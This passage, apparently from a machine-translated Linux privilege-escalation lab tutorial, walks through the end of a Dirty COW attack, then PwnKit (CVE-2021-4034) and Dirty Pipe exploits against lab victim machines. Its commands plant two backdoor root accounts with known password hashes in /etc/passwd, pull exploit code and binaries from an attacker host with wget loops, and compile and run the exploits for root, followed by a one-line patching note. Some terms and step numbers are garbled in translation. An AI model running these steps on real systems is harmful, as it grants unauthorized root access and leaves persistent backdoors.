firefart<br/>id</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi mf"><img src="../Images/c1d8fda171ce4a5b00da684ee6eec8f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:700/format:webp/1*pZuzpr4KKclg6X5HYyMsfg.png"/></div></figure><p id="0fb7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们继续一些开发后的步骤来添加2个额外的根用户。</p><p id="845d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">18.在192.168.62.162上执行(受害机器，Metasploitable第一个反向外壳)。</p><p id="0e5c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在原来的/etc/passwd (/tmp/passwd)中添加一个新的根用户hacker1 (DES密码“hacker”)和hacker2 (MD5-crypt密码“hacker”)</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="8479" class="ku kv iq kq b gy kw kx l ky kz">echo hacker1:UHRTHrsaEfHQ2:0:0:Hacker:/root:/bin/bash&gt;&gt;/tmp/passwd</span><span id="179b" class="ku kv iq kq b gy lw kx l ky kz">echo hacker2:\$1\$hacker\$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash&gt;&gt;/tmp/passwd</span><span id="fbbe" class="ku kv iq kq b gy lw kx l ky kz">chmod 644 /tmp/passwd</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi mg"><img src="../Images/e549acbab4be783fb15b37a56c6f016e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1140/format:webp/1*BkCgJC0Tb4GexViRkbqbxA.png"/></div></figure><p id="bb09" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">19.在192.168.62.162上执行(受害机器，Metasploitable第一个反向外壳)。</p><p id="cc2c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Restore /etc/passwd并退出用户firefart。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="d9c8" class="ku kv iq kq b gy kw kx l ky kz">cp /tmp/passwd /etc/passwd<br/>exit</span></pre><p id="5ae4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">20.在192.168.62.162上执行(受害者机器，Metasploitable第二个反向外壳)。</p><p id="53fb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在切换到后门用户“黑客1”或“黑客2”(密码“黑客”)</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="e3c2" class="ku kv iq kq b gy kw kx l ky kz">su hacker1</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/ded0ae967aa65e4c231110f0e580505c.png" data-original-src="https://miro.medium.com/v2/resize:fit:528/format:webp/1*VrgQBCf2BNXtx3P6jTZMqw.png"/></div><figcaption class="mi mj gj gh gi mk ml bd b be z dk translated">黑客1是“root”</figcaption></figure><p id="07a0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有一个根后门，无需再次利用漏洞！</p><p id="3797" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">pol kit的PK exec(CVE-2021–4034)<br/></strong>CVE-2021–4034不是内核漏洞，而是SUID根程序PK exec(pol kit的一部分)中的漏洞。</p><p id="d455" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Qualys的研究人员在polkit的pkexec中发现了一个内存损坏漏洞，pol kit是一个默认安装在所有主要Linux发行版上的SUID根程序。通过在默认配置中利用此漏洞，此易受攻击的漏洞允许无权限用户获得易受攻击主机上的完全超级用户权限。</p><p id="1e0b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">背景资料:<a class="ae ly" href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" rel="noopener ugc nofollow" target="_blank">https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt</a></p><p id="3859" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">内核:影响自2009年5月pkexec的第一个版本以来的所有版本</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="7572" class="ku kv iq kq b gy kw kx l ky kz">Victim 02 (Polkit)<br/>- Ubuntu 16.04 (x64)<br/>- IP-Address: 192.168.62.177<br/>- Kernel version: 4.4.0–21-generic</span></pre><p id="04cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">21.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="1519" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下载polkit漏洞利用</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="aac1" class="ku kv iq kq b gy kw kx l ky kz">cd /tmp<br/>git clone <a class="ae ly" href="https://github.com/berdav/CVE-2021-4034.git" rel="noopener ugc nofollow" target="_blank">https://github.com/berdav/CVE-2021-4034.git</a></span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi mm"><img src="../Images/9e78d0eeb073839888b8832edf0a9a34.png" data-original-src="https://miro.medium.com/v2/resize:fit:1052/format:webp/1*hFlGs7PZO6QRGDpD-eb7FA.png"/></div></figure><p id="e1fe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">22.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="9454" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从源代码创建焦油球</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="3132" class="ku kv iq kq b gy kw kx l ky kz">cd /tmp<br/>tar -zcvf CVE-2021–4034-source.gz CVE-2021–4034</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/3b40fa50dc0d89b8a11393280cf8e75c.png" data-original-src="https://miro.medium.com/v2/resize:fit:836/format:webp/1*Ae8RPFRAoJbjTb2dZSUqww.png"/></div></figure><p id="7b07" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">23.可选在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="f9cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编译polkit漏洞(在Kali上)。仅当漏洞无法在本地编译时才执行此步骤。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="fa90" class="ku kv iq kq b gy kw kx l ky kz">cd /tmp/CVE-2021–4034<br/>make</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi lv"><img src="../Images/698b97b3045ca2378fa1d3f9e33533dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:892/format:webp/1*giwX1Dm1gjgZmjxOVdsDcQ.png"/></div></figure><p id="2e47" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">24.可选在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="d1f3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从x64编译的漏洞创建焦油球。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="a6db" class="ku kv iq kq b gy kw kx l ky kz">cd /tmp<br/>tar -zcvf CVE-2021–4034.gz CVE-2021–4034</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/43466a2df938594c41b242af6560a702.png" data-original-src="https://miro.medium.com/v2/resize:fit:852/format:webp/1*NjQTDb259hNNtYZvtq4CjQ.png"/></div></figure><p id="409a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">25.执行于192.168.62.177(受害者机器，Ubuntu 16.04)。</p><p id="67cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从Kali下载两个焦油球。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="d222" class="ku kv iq kq b gy kw kx l ky kz">file='CVE-2021-4034.gz CVE-2021-4034-source.gz'<br/>LHOST=192.168.62.161<br/>LPORT=80<br/>files="${file}"<br/>for file in $(echo $files); do wget --no-verbose http://${LHOST}:${LPORT}/${file} -O /tmp/${file}; chmod 755 /tmp/${file}; done</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi lx"><img src="../Images/b49c04325f2fd6c5002e30c57712f517.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3lR2cEiO7kMkCmXQcbWruQ.png"/></div></div></figure><p id="9481" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">26.执行于192.168.62.177(受害者机器，Ubuntu 16.04)。</p><p id="72f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">提取源文件。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="09ff" class="ku kv iq kq b gy kw kx l ky kz">cd /tmp<br/>tar -xzvf CVE-2021–4034-source.gz</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi lx"><img src="../Images/28ce88d5c79bbe5727eddec044570861.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ucJaazo0XXVmWbK2BYY92w.png"/></div></div></figure><p id="2a68" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">27.执行于192.168.62.177(受害者机器，Ubuntu 16.04)。</p><p id="17b2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编译漏洞。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="bb86" class="ku kv iq kq b gy kw kx l ky kz">cd /tmp/CVE-2021–4034<br/>make</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi lx"><img src="../Images/357b4a70d2630f6b1ad020e58a80a1a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yYe--3Bah2G-EK6bbW2uPQ.png"/></div></div></figure><p id="c3ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">28.执行于192.168.62.177(受害者机器，Ubuntu 16.04)。</p><p id="1219" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">执行漏洞利用。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="7494" class="ku kv iq kq b gy kw kx l ky kz">cd /tmp/CVE-2021–4034<br/>./cve-2021–4034</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi lx"><img src="../Images/7d57e679915384552eab65a84ed04cbf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_SuQ9G-1ektmH8E_bQWVCg.png"/></div></div></figure><p id="96ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有根权限！</p><p id="c8bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">Dirty-Pipe(CVE-2022–0867)<br/></strong>CVE-2022–0847是5.8到5.10之间的Linux内核中的一个漏洞，可以覆盖任意只读文件中的数据。这会导致权限提升，因为非特权进程可以将代码注入根进程。</p><p id="c1a0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">背景资料:<a class="ae ly" href="https://sysdig.com/blog/cve-2022-0847-dirty-pipe-sysdig/" rel="noopener ugc nofollow" target="_blank">https://sysdig.com/blog/cve-2022-0847-dirty-pipe-sysdig/</a></p><p id="0945" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">内核:5.8到5.10–108</p><p id="12c8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">受害者03(脏管道)<br/> - Kali Linux (x86) <br/> - IP地址:192.168.62.171 <br/> -内核版本:5.10–40</p><p id="47ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">29.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="ddc1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下载脏管道漏洞</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="7ca4" class="ku kv iq kq b gy kw kx l ky kz">file=exploit-1<br/>wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/${file}.c -O /tmp/${file}.c</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi mp"><img src="../Images/f22421da9f7b2e748690a70ceb16eba0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4byocD9dijTJl6q_UoyuTQ.png"/></div></div></figure><p id="f49c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">30.可选项:在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="6973" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Kali (x86和x64版本)上编译漏洞。仅当无法在目标上本地编译该漏洞时，才执行此步骤。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="5a58" class="ku kv iq kq b gy kw kx l ky kz">file=exploit-1<br/>gcc -m32 -static -o /tmp/${file}_x86 /tmp/${file}.c<br/>gcc -static -o /tmp/${file}_x64 /tmp/${file}.c</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi mq"><img src="../Images/651aea366744b062a5331e4f9c0d0d87.png" data-original-src="https://miro.medium.com/v2/resize:fit:860/format:webp/1*8lU4Cn_pH9UAyJ2yQ6MCeQ.png"/></div></figure><p id="0e27" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">31.在192.168.62.171上执行(受害机器，Kali Linux 2022.1 x86)。</p><p id="6286" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从Kali攻击者机器下载漏洞源代码和编译版本。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="7038" class="ku kv iq kq b gy kw kx l ky kz">file=exploit-1<br/>LHOST=192.168.62.161<br/>LPORT=80<br/>files="${file}.c  ${file}_x86 ${file}_x64"<br/>for file in $(echo $files); do wget --no-verbose http://${LHOST}:${LPORT}/${file} -O /tmp/${file}; chmod 755 /tmp/${file}; done</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi lx"><img src="../Images/901b97434948c8008445796453e13e38.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Twq83Euqqjf00TsvIzn3cA.png"/></div></div></figure><p id="0225" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">23.在192.168.62.171上执行(受害机器，Kali Linux 2022.1 x86)。</p><p id="f326" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编译漏洞。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="f2e7" class="ku kv iq kq b gy kw kx l ky kz">file=exploit-1<br/>gcc -o /tmp/${file} /tmp/${file}.c</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi lx"><img src="../Images/f4406c7f78a26f1d5a7623bcff6dcc58.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tvxOEY0DVgayl8liU1Qosg.png"/></div></div></figure><p id="1f6d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">33.在192.168.62.171上执行(受害机器，Kali Linux 2022.1 x86)。</p><p id="9396" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">执行漏洞利用。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="882f" class="ku kv iq kq b gy kw kx l ky kz">file=exploit-1<br/>/tmp/${file}</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi mr"><img src="../Images/1d0ec39b45ccf1941d750412545ef501.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VzVMmozOyyfcdvEP6V3Qkw.png"/></div></div><figcaption class="mi mj gj gh gi mk ml bd b be z dk translated">忽略错误消息。</figcaption></figure><p id="5da9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意:忽略错误“系统()函数调用…”。</p><p id="9eae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">34.在192.168.62.171上执行(受害机器，Kali Linux 2022.1 x86)。</p><p id="48a0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用密码“管道”切换到root用户</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="37dc" class="ku kv iq kq b gy kw kx l ky kz">su root</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi ms"><img src="../Images/f678c24eae951a8ccd740a0321a81596.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SV9uNVumfyYu1jgwses2gw.png"/></div></div><figcaption class="mi mj gj gh gi mk ml bd b be z dk translated">我们是“根”用户！</figcaption></figure><p id="dbf6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们是根！</p><p id="68e4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">缓解<br/> </strong>缓解所有这些漏洞是为了让您的发行版拥有最新的安全补丁。</p><p id="66b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">归功于<br/> </strong>菲尔·奥斯特发现了“脏牛”漏洞。<br/>Qualis发现了“Polkit”漏洞。<br/>cm4all发现了“脏管道”漏洞。<br/>感谢MZet维护Linux-exploit-suggest er . sh(https://github.com/mzet-)</p></div><div class="ab cl mt mu hu mv" role="separator"><span class="mw bw bk mx my mz"/><span class="mw bw bk mx my mz"/><span class="mw bw bk mx my"/></div><div class="ij ik il im in"><h2 id="5ff3" class="ku kv iq bd na nb nc dn nd ne nf dp ng jy nh ni nj kc nk nl nm kg nn no np nq bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae ly" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>